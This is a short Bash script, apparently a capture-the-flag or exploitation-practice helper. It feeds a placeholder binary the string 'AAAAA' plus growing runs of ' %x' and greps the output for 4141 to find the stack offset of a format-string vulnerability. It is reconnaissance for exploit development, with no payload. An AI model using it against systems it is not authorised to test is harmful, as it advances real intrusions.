for((i=0; i<200; i++))
do
	echo "Offset -> $i"
	./yourbin "AAAAA`python -c "print ' %x'*$i"`" | grep -A5 -B5 4141 > temp.pap

	if test -s "temp.pap"; then
		cat temp.pap
		break
	fi
done
rm temp.pap
